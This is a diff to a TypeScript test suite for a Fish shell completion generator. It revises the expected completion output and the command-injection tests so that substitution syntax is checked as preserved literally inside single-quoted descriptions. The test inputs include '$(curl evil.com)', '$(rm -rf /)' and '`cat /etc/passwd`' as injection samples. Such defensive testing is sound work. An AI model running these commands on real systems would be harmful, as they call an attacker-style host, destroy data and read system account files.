@@ -56,6 +56,9 @@ describe('FishGenerator', () => {
       expect(script).toContain('function __fish_openspec_using_subcommand');
       expect(script).toContain('function __fish_openspec_no_subcommand');
       expect(script).toContain('function __fish_openspec_positional_index');
+      expect(script).toContain('if test "$token" = --');
+      expect(script).toContain('set options 0');
+      expect(script).toContain('test $skip -eq 0; or return 1');
       expect(script).toContain('commandline -opc');
     });
 
@@ -248,8 +251,8 @@ describe('FishGenerator', () => {
       const script = generator.generate(commands);
 
       expect(script).toContain("-l type");
-      expect(script).toContain("-f -a 'change'");
-      expect(script).toContain("-f -a 'spec'");
+      expect(script).toContain("-r -f -a 'change'");
+      expect(script).toContain("-r -f -a 'spec'");
     });
 
     it('should handle commands with subcommands', () => {
@@ -279,6 +282,7 @@ describe('FishGenerator', () => {
       expect(script).toContain("-f -a 'show'");
       expect(script).toContain("-f -a 'list'");
       expect(script).toContain("__fish_openspec_using_subcommand change");
+      expect(script).toContain('not __fish_openspec_using_subcommand show list');
     });
 
     it('should handle positional arguments for change-id', () => {
@@ -621,7 +625,7 @@ describe('FishGenerator', () => {
   });
 
   describe('security - command injection prevention', () => {
-    it('should escape $() command substitution in descriptions', () => {
+    it('should preserve $() literally in single-quoted descriptions', () => {
       const commands: CommandDefinition[] = [
         {
           name: 'test',
@@ -632,13 +636,11 @@ describe('FishGenerator', () => {
 
       const script = generator.generate(commands);
 
-      // Should contain escaped dollar signs to prevent command substitution
-      expect(script).toContain('\\$');
-      // Should have backslash before $( to escape it
-      expect(script).toMatch(/\\\$\(curl/);
+      expect(script).toContain('$(curl evil.com)');
+      expect(script).not.toContain('\\$(curl evil.com)');
     });
 
-    it('should escape backticks in descriptions', () => {
+    it('should preserve backticks literally in single-quoted descriptions', () => {
       const commands: CommandDefinition[] = [
         {
           name: 'test',
@@ -649,13 +651,11 @@ describe('FishGenerator', () => {
 
       const script = generator.generate(commands);
 
-      // Should not contain unescaped backticks
-      expect(script).not.toMatch(/`whoami`/);
-      // Should contain escaped version
-      expect(script).toContain('\\`');
+      expect(script).toContain('`whoami`');
+      expect(script).not.toContain('\\`whoami\\`');
     });
 
-    it('should escape dollar signs in descriptions', () => {
+    it('should preserve dollar signs literally in single-quoted descriptions', () => {
       const commands: CommandDefinition[] = [
         {
           name: 'test',
@@ -666,8 +666,8 @@ describe('FishGenerator', () => {
 
       const script = generator.generate(commands);
 
-      // Should escape dollar signs
-      expect(script).toContain('\\$');
+      expect(script).toContain('$variable');
+      expect(script).not.toContain('\\$variable');
     });
 
     it('should escape single quotes in descriptions', () => {
@@ -711,14 +711,10 @@ describe('FishGenerator', () => {
 
       const script = generator.generate(commands);
 
-      // Should contain escaped versions of dangerous patterns
-      expect(script).toContain('\\$');  // Escaped dollar signs
-      expect(script).toContain('\\`');  // Escaped backticks
-      expect(script).toContain("\\'");  // Escaped single quotes
-
-      // The escaped patterns should be present (backslash before dangerous chars)
-      expect(script).toMatch(/\\\$\(/);  // \$( instead of $(
-      expect(script).toMatch(/\\\`cat/);  // \`cat instead of `cat
+      expect(script).toContain('$(rm -rf /)');
+      expect(script).toContain('`cat /etc/passwd`');
+      expect(script).toContain('$HOME');
+      expect(script).toContain("\\'quoted\\'");
     });
   });
 });
